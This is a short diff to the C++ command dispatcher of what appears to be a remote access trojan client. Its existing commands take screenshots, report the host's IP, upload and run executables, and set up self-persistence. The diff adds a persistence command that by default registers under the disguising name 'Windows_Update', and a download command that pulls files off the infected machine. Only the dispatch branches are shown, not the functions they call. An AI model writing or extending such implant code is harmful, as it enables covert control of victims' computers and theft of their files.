@@ -29,6 +29,14 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	{
 		arg_self_persistence();
 	}
+	else if (args[0] == "persistence" && args.size() == 3)
+	{
+		persistence(client,args[1], (wchar_t*)args[2].c_str());
+	}
+	else if (args[0] == "persistence" && args.size() == 2)
+	{
+		persistence(client, args[1],L"Windows_Update");
+	}
 	else if (args[0] == "getip" && args.size() == 1)
 	{
 		client->send_b(Auto::get_ip().c_str());
@@ -82,6 +90,10 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	else if (args[0] == "upload_exe" && args.size() == 2)
 	{
 		Shell::uploadToClientExe(client,args[1]);
+	}
+	else if (args[0] == "download" && args.size() == 2)
+	{
+		Transfer::downloadFromClient(client, args[1]);
 	}
 	else if (args[0] == "screenshot" && args.size() ==1)
 	{
